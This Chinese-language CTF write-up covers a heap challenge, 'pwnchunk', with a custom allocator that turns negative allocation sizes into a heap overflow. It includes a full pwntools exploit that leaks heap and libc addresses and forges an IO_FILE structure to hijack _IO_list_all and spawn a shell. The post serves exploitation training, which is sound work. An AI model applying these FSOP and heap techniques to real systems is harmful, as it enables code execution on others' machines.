---
date: 2026-02-20 10:31:59
layout: post
title: 阿里 CTF writeup -- pwnchunk
subtitle: 
description: >-
    
image: >-
  /assets/img/uploads/saudi_cat.jpg
optimized_image: >-
  /assets/img/uploads/saudi_cat.jpg
category: ctf
tags:
  - heap pwn
author: rosayxy
paginate: true
---

又是一年准备 seccon，今年寒假花了大量时间在玩，准备毕设（至少拿到第一个 CVE 编号了！）和拔智齿上，所以确实比赛这边没咋推进w

以及吐槽一下学校这边不给报销去日本的比赛，机票好贵....

进入正题，这个题目我是赛后复现的，在找漏洞这块参考了官方的 writeup

## 题目

它自己实现了一个堆分配器，实现了 malloc 和 free 功能，并且给了一个这个分配器对应的菜单堆。正常的这种题的思路（比如说之前遇到过的 jemalloc 题）都是菜单中有洞，结合它的分配器实现进行攻击（类似于自己根据分配器 yy 一个 how2heap 原语），本博客之后的 malloc 和 free 都是基于这个自己的堆分配器来说的，而不是 ptmalloc。

但是这个题的菜单堆感觉检查还是挺完善的，除了一个 leak 原语（读入字符不会补 0）以外没有其他洞，看了官方 writeup 才发现漏洞是在 malloc 的机制中，在特定情况下，当 malloc 大小为不太小的负数（如 -1， -2 这种），它对 size 会进行 rounding 如下

```c
rounding_size = (size_1 + 39) & 0xFFFFFFFFFFFFFFF0LL;
```

之后拿这个 rounding_size 去找合适的 chunk 来分配，所以如果 size 传入为负数的话，可能就会被 round 为整数，得到 rounding_size 为 0x20 这种正常值，接着来做分配，结合 `create_user` 中 “个人简介” 这个输入没有进行长度检查的漏洞，就可以构造出一个无限长度的堆溢出

### leak
`create_user` 中的个人简介输入没有补 "\0"，所以可以通过泄露堆上残留内容来拿到堆/libc 地址

那么堆上有什么残留的内容呢？它有一个存放 `msg` 消息的变长数组，它每发现 size == capacity 的时候都会扩容 10 个元素大小，是先 malloc( 8 * size + 10) 再 free(old_msg_storage)，所以在 free 之后，原来的 msg_storage 结构体就会被释放掉，但是它的内容还在堆上没有被覆盖，所以我们就可以通过泄露个人简介来拿到这个 msg_storage 结构体中的内容，从而泄露堆地址和 libc 地址。

libc 地址的泄露是通过用 mmap chunk 来做的，也算是基操了

```py
# exit is of idx 0
for i in range(5):
    create_user("a\n", "a\n", 20, 0x70, "a"*0x7 + "\n") # 0
    delete_user() # free the user struct, but the msg_storage struct is still there, so we can leak the heap address


create_user("a\n", "a\n", 20, 0x20000, "a"*0x7 + "\n")
delete_user()
create_user("a\n", "a\n", 20, 0x20000, "a"*0x7 + "\n")
delete_user()

create_user("a\n", "a\n", 20, 0x70, "a"*0x7 + "\n")

# gdb.attach(p)
# pause()
# I need try some heap fengshui...
for i in range(25):
    create_msg(0x11, "a\n", 0x11, "b\n") # free 的堆块在第 0 个
# heap fengshui again

delete_user()
create_user("a\n", "a\n", 20, -2, "b\n") # not enough to leak sadly, we'll try to leak from the next chunk
show_user()

p.recvuntil("个人简介: ")
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("heap leak: " + hex(heap_leak))

# 继续转着分配吧
for i in range(7):
    delete_user()
    create_user("a\n", "a\n", 20, 2, "b\n")

delete_user()
# 这个可能需要转到一个从 mmap 分配的堆块才行
create_user("a\n", "a\n", 20, 0x30, "a"*0x20 + "aaaabbbb" + "\n")
show_user()
p.recvuntil("aaaabbbb")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc leak: " + hex(libc_leak))

libc_base = libc_leak + 0x13ef8
log.info("libc base: " + hex(libc_base))

# start exploitation


```

### exploitation

#### 堆风水
我们想要让能溢出的 bio 堆块位于 `msg` 变长数组的前面，这样该怎么做呢？大概是分为 2 步。在此之前，有一个前提条件是这个自己实现的堆分配器分为 16 个 region，每次 malloc 分配成功后都会轮转一次，到下一个 region 去进行下一次的 malloc，我们可以通过 `send_msg` 中不符合条件的 malloc 之后再 free 来完成 region 的轮转，如下

```py
def malloc_twice():
    p.sendlineafter("选择功能: ", "4")
    p.sendlineafter("标题长度: ", "17")
    p.sendafter("标题: ", "a\n")
    p.sendlineafter("内容长度: ", "10")

def malloc_once():
    p.sendlineafter("选择功能: ", "4")
    p.sendlineafter("标题长度: ", "10000")
    p.sendlineafter("内容长度: ", "10")
```

1. 轮转使得 free 的 `msg_storage` 结构体位于新分配的 `msg` 变长数组的前面
2. 轮转使得 `create_user` 从同一个 region 分配出 `bio`（个人简介）结构体，这样它会从被 free 的 `msg_storage` 结构体所在的 region 分配出 `bio` 结构体，这样就能保证 `bio` 结构体位于 `msg` 变长数组的前面

是不是还挺直接的

#### 后续

通过堆溢出覆盖 msg_storage 的指针，指向堆上已布局的 `fake_msg` 结构体。其中，`msg` 的 `title` 字段指向 IO_list_all 地址，通过 edit msg 的操作来进行任意地址写，写入堆上已布局的 fake IO_FILE 结构体地址到 IO_list_all 中，用 exit 来触发 IO 流从而 getshell

### 完整 exp

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process("./pwnchunk")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# when malloc size is negative
# checking out the heap fengshui
# user struct: 0x70: name email bio(ptr) age and stuffs; msg_storage struct: ptrs; msg: author(ptr), title(ptr), 

def create_user(name, email, age, length, bio):
    p.sendlineafter("选择功能: ", "1")
    p.sendafter("用户名: ", name)
    p.sendafter("邮箱: ", email)
    p.sendlineafter("年龄: ", str(age))
    p.sendlineafter("简介长度: ", str(length))
    p.sendafter("简介: ", bio)

def delete_user():
    p.sendlineafter("选择功能: ", "2")

def show_user():
    p.sendlineafter("选择功能: ", "3")

def create_msg(title_len, title, content_len, content):
    p.sendlineafter("选择功能: ", "4")
    p.sendlineafter("标题长度: ", str(title_len))
    p.sendafter("标题: ", title)
    p.sendlineafter("内容长度: ", str(content_len))
    p.sendafter("内容: ", content)

def show_msg():
    p.sendlineafter("选择功能: ", "5")

def like_msg():
    p.sendlineafter("选择功能: ", "6")

def edit_msg(idx, new_title, new_msg):
    p.sendlineafter("选择功能: ", "7")
    p.sendlineafter("编号", str(idx))
    p.sendafter("新的标题: ", new_title)
    p.sendafter("新的内容: ", new_msg)

def like_msg(idx):
    p.sendlineafter("选择功能: ", "6")
    p.sendlineafter("编号: ", str(idx))

def malloc_twice():
    p.sendlineafter("选择功能: ", "4")
    p.sendlineafter("标题长度: ", "17")
    p.sendafter("标题: ", "a\n")
    p.sendlineafter("内容长度: ", "10")

def malloc_once():
    p.sendlineafter("选择功能: ", "4")
    p.sendlineafter("标题长度: ", "10000")
    p.sendlineafter("内容长度: ", "10")
# exit is of idx 0
for i in range(5):
    create_user("a\n", "a\n", 20, 0x70, "a"*0x7 + "\n") # 0
    delete_user() # free the user struct, but the msg_storage struct is still there, so we can leak the heap address


create_user("a\n", "a\n", 20, 0x20000, "a"*0x7 + "\n")
delete_user()
create_user("a\n", "a\n", 20, 0x20000, "a"*0x7 + "\n")
delete_user()

create_user("a\n", "a\n", 20, 0x70, "a"*0x7 + "\n")

# gdb.attach(p)
# pause()
# I need try some heap fengshui...
for i in range(25):
    create_msg(0x11, "a\n", 0x11, "b\n") # free 的堆块在第 0 个
# heap fengshui again

delete_user()
create_user("a\n", "a\n", 20, -2, "b\n") # not enough to leak sadly, we'll try to leak from the next chunk
show_user()

p.recvuntil("个人简介: ")
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("heap leak: " + hex(heap_leak))

# 继续转着分配吧
for i in range(7):
    delete_user()
    create_user("a\n", "a\n", 20, 2, "b\n")

delete_user()
# 这个可能需要转到一个从 mmap 分配的堆块才行
create_user("a\n", "a\n", 20, 0x30, "a"*0x20 + "aaaabbbb" + "\n")
show_user()
p.recvuntil("aaaabbbb")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc leak: " + hex(libc_leak))

libc_base = libc_leak + 0x13ef8
log.info("libc base: " + hex(libc_base))

# start exploitation

# 使得 malloc 和 free 在同一个 slot: 则连续 malloc 15 次
for i in range(7):
    malloc_twice()

malloc_once()
for i in range(6):
    create_msg(0x11, "a\n", 0x11, "b\n")

# 还差 12 次
for i in range(4):
    malloc_twice()
malloc_once()
delete_user()

# 再转过来，需要伪造堆上结构体
fake_msg_addr = heap_leak + 0xb05c6
fake_io_addr = 0x40 + fake_msg_addr
random_heap_addr = heap_leak
io_list_all = libc_base + libc.sym["_IO_list_all"]


system_addr=libc_base+libc.sym["system"]
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x21ca60)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x2170c0 + libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)


payload = p64(0) * 4 + p64(io_list_all) + p64(random_heap_addr) + p64(0)*2 + fake_io_file
log.info("heap leak: " + hex(heap_leak))

create_user("a\n", "a\n", 20, len(payload) + 0x10, payload + b"\n")
delete_user()
# gdb.attach(p)
# pause()
# 0x562b19445362
create_user("a\n", "a\n", 20, -2, b"b"*0x280 + p64(fake_msg_addr) + b"\n") # 这个时候 msg_storage 的 ptr 就被覆盖了，指向了我们伪造的 msg 结构体
edit_msg(1, p64(fake_io_addr)[:6] + b"\n", p64(fake_io_addr)[:6] + b"\n") # 这个时候 msg 的 author 和 title 都被覆盖了，指向了我们伪造的 io_file 结构体

p.sendlineafter("选择功能: ", "0")
p.interactive()
```